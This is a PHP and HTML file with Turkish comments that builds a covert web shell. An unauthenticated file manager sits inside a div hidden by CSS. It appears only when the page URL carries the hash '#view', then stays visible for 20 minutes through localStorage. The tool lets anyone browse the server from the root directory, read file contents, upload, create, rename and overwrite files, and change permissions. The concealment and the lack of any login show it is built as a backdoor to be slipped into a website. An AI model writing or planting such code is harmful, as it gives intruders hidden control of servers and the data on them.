

<style>
        #myDiv {
            display: none; /* Varsayılan olarak gizli */
            background-color: lightblue;
            padding: 20px;
            margin: 20px;
        }
    </style>
    <div id="myDiv">
       
       <?php
// Hangi dizinde olduğumuzu belirliyoruz
$root = __DIR__; // PHP dosyasının bulunduğu dizin
$top_level = '/'; // Sunucunun en üst düzeyi
$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $root;

// Dosya yükleme işlemi
$uploaded_file_path = ''; // Yüklenen dosyanın yolu
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['file'])) {
    $target_file = $current_dir . '/' . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
        $uploaded_file_path = htmlspecialchars($target_file, ENT_QUOTES, 'UTF-8');
        echo '<script>alert("Dosya başarıyla yüklendi: ' . htmlspecialchars(basename($_FILES['file']['name'])) . '");</script>';
    } else {
        echo '<script>alert("Dosya yüklenemedi!");</script>';
    }
}

// Dosya izinlerini ayarlama işlemi
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['chmod_file'])) {
    $file_to_chmod = $current_dir . '/' . basename($_POST['chmod_name']);
    $new_permissions = octdec($_POST['chmod_value']);
    if (chmod($file_to_chmod, $new_permissions)) {
        echo '<script>alert("İzinler başarıyla değiştirildi: ' . htmlspecialchars($_POST['chmod_name'], ENT_QUOTES, 'UTF-8') . '");</script>';
    } else {
        echo '<script>alert("İzin değiştirilemedi!");</script>';
    }
}

// Dosya adını ve içeriğini değiştirme işlemi
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['edit_file'])) {
    $old_name = basename($_POST['old_name']);
    $new_name = basename($_POST['new_name']);
    $file_content = stripslashes($_POST['file_content']);
    
    $old_file_path = $current_dir . '/' . $old_name;
    $new_file_path = $current_dir . '/' . $new_name;

    // Dosya ismini değiştirme
    if ($old_name !== $new_name) {
        rename($old_file_path, $new_file_path);
    }
    
    // Dosya içeriğini güncelleme
    file_put_contents($new_file_path, $file_content);
    echo '<script>alert("Dosya başarıyla güncellendi: ' . htmlspecialchars($new_name, ENT_QUOTES, 'UTF-8') . '");</script>';
}

// Mevcut dizindeki dosyaları ve dizinleri listeliyoruz
$files = scandir($current_dir);

function is_image($file) {
    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    return in_array($ext, ['jpg', 'jpeg', 'png', 'gif']);
}

// Dizinlerde gezinme bağlantılarını oluşturma
$navigation_links = [];

// Üst dizin bağlantısı
$parent_dir = dirname($current_dir);
if ($parent_dir !== $current_dir) {
    $navigation_links[] = '<li><a href="?dir=' . urlencode($parent_dir) . '">.. (Üst Dizin)</a></li>';
}

// Dosya ve dizinler için bağlantılar oluşturma
foreach ($files as $file) {
    if ($file == '.' || $file == '..') continue;
    $file_path = $current_dir . '/' . $file;
    if (is_dir($file_path)) {
        $navigation_links[] = '<li><a href="?dir=' . urlencode($file_path) . '">' . htmlspecialchars($file) . '</a> (Dizin)</li>';
    } else {
        $navigation_links[] = '<li>' . htmlspecialchars($file) . ' ' . $icon . 
            '<button onclick="openEditForm(\'' . htmlspecialchars($file) . '\', `' . htmlspecialchars(file_get_contents($file_path)) . '`)">Düzenle</button>
            <button onclick="openChmodForm(\'' . htmlspecialchars($file) . '\')">İzinleri Değiştir</button>
            </li>';
    }
}

// Site dizinine gitmek için bir bağlantı ekliyoruz
$navigation_links[] = '<li><a href="?dir=' . urlencode($root) . '">Site Dizinine Git</a></li>';
$navigation_links[] = '<li><a href="?dir=' . urlencode($top_level) . '">En Üst Dizinine Git</a></li>';

// Kullanıcıya dosyaları ve dizinleri gösterme
echo '<h2>Mevcut Dizin:</h2>';
echo '<form method="get">';
echo '<input type="text" name="dir" value="' . htmlspecialchars($current_dir) . '" style="width:400px;">';
echo '<input type="submit" value="Git">';
echo '</form>';
echo "<ul>";
foreach ($navigation_links as $link) {
    echo $link;
}
echo "</ul>";

// Dosya Yükleme Formu
echo '<h2>Dosya Yükle</h2>';
echo '<form action="" method="post" enctype="multipart/form-data">';
echo '<input type="file" name="file" required>';
echo '<input type="submit" value="Yükle">';
echo '</form>';

// Yeni dosya oluşturma formu
echo '<h2>Yeni Dosya Oluştur</h2>';
echo '<form action="" method="post">';
echo '<input type="text" name="new_file_name" placeholder="Dosya Adı" required>';
echo '<textarea name="new_file_content" placeholder="Dosya İçeriği" required></textarea>';
echo '<input type="submit" name="create_file" value="Oluştur">';
echo '</form>';

// Yeni dosya oluşturma işlemi
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['create_file'])) {
    $new_file_name = basename($_POST['new_file_name']);
    $new_file_content = stripslashes($_POST['new_file_content']);
    $new_file_path = $current_dir . '/' . $new_file_name;

    // Dosya oluşturma
    file_put_contents($new_file_path, $new_file_content);
    echo '<script>alert("Yeni dosya başarıyla oluşturuldu: ' . htmlspecialchars($new_file_name, ENT_QUOTES, 'UTF-8') . '");</script>';
}
?>

<!-- Düzenleme Formu -->
<div id="edit_form" style="display:none; border:1px solid #ccc; padding:10px; margin-top:10px;">
    <h3>Dosya Düzenle</h3>
    <form id="fileEditForm" action="" method="post">
        <input type="hidden" name="old_name" id="edit_old_name">
        <label for="edit_new_name">Yeni İsim:</label>
        <input type="text" name="new_name" id="edit_new_name" required>
        <label for="edit_file_content">Dosya İçeriği:</label>
        <textarea name="file_content" id="edit_file_content" required></textarea>
        <input type="submit" name="edit_file" value="Güncelle">
    </form>
    <button onclick="closeEditForm()">Kapat</button>
</div>

<!-- chmod Formu -->
<div id="chmod_form" style="display:none; border:1px solid #ccc; padding:10px; margin-top:10px;">
    <h3>İzinleri Değiştir</h3>
    <form id="fileChmodForm" action="" method="post">
        <input type="hidden" name="chmod_name" id="chmod_file_name">
        <label for="chmod_value">Yeni İzin (örneğin 0755):</label>
        <input type="text" name="chmod_value" id="chmod_value" required>
        <input type="submit" name="chmod_file" value="İzinleri Güncelle">
    </form>
    <button onclick="closeChmodForm()">Kapat</button>
</div>

<script>
function openEditForm(fileName, fileContent) {
    document.getElementById('edit_old_name').value = fileName;
    document.getElementById('edit_new_name').value = fileName;
    document.getElementById('edit_file_content').value = fileContent;
    document.getElementById('edit_form').style.display = 'block';
}

function closeEditForm() {
    document.getElementById('edit_form').style.display = 'none';
}

function openChmodForm(fileName) {
    document.getElementById('chmod_file_name').value = fileName;
    document.getElementById('chmod_form').style.display = 'block';
}

function closeChmodForm() {
    document.getElementById('chmod_form').style.display = 'none';
}
</script>
       
        <button id="hideButton">Gizle</button>
    </div>

    <script>
        // 20 dakika = 20 * 60 * 1000 milisaniye
        const SHOW_DURATION = 20 * 60 * 1000; // 20 dakika
        const DIV_ID = "myDiv";
        const LAST_VISIT_KEY = "lastDivVisibilityTime";

        document.addEventListener("DOMContentLoaded", () => {
            const div = document.getElementById(DIV_ID);
            const hideButton = document.getElementById("hideButton");

            // Önce kaydedilmiş zamanı al ve kontrol et
            const lastVisibleTime = localStorage.getItem(LAST_VISIT_KEY);
            const currentTime = new Date().getTime();

            // Eğer zaman geçmediyse (20 dakika içinde) div'i göster
            if (lastVisibleTime && (currentTime - lastVisibleTime < SHOW_DURATION)) {
                showDiv(div);
            } else if (window.location.hash === "#view") {
                // Eğer hash #view ise, div'i göster ve zamanı kaydet
                showDiv(div);
                localStorage.setItem(LAST_VISIT_KEY, currentTime); // Zamanı kaydet
            }

            // "Gizle" butonuna tıklayınca div'i gizle ve zamanı sıfırla
            hideButton.addEventListener("click", () => {
                hideDiv(div);
                localStorage.removeItem(LAST_VISIT_KEY); // Zamanı sıfırla
            });

            // Div'i gösteren fonksiyon
            function showDiv(div) {
                div.style.display = "block"; // Div'i görünür yap
            }

            // Div'i gizleyen fonksiyon
            function hideDiv(div) {
                div.style.display = "none"; // Div'i görünmez yap
            }

            // Zamanı sürekli kontrol et (sayfa yenilense bile)
            setInterval(() => {
                const lastVisibleTime = localStorage.getItem(LAST_VISIT_KEY);
                const currentTime = new Date().getTime();

                // Eğer 20 dakika geçmişse div'i gizle
                if (lastVisibleTime && (currentTime - lastVisibleTime >= SHOW_DURATION)) {
                    hideDiv(div);
                }
            }, 1000); // Her saniye kontrol et
        });
    </script>
